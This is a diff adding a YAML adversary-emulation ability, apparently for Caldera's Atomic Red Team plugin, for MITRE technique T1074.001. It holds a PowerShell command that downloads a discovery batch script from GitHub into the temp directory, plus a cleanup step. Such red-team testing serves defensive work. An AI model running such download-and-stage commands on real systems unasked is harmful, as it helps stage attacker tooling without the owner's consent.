@@ -1,0 +1,24 @@
+---
+- id: 4382d53f0f53399e72c728d019fffd77
+  name: Stage data from Discovery.bat
+  description: 'Utilize powershell to download discovery.bat and save to a local file.
+    This emulates an attacker downloading data collection tools onto the host. Upon
+    execution,
+
+    verify that the file is saved in the temp directory.
+
+    '
+  tactic: collection
+  technique:
+    attack_id: T1074.001
+    name: 'Data Staged: Local Data Staging'
+  platforms:
+    windows:
+      psh:
+        command: Invoke-WebRequest "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.bat"
+          -OutFile $env:TEMP\discovery.bat
+        payloads: []
+        cleanup: Remove-Item -Force $env:TEMP\discovery.bat -ErrorAction Ignore
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
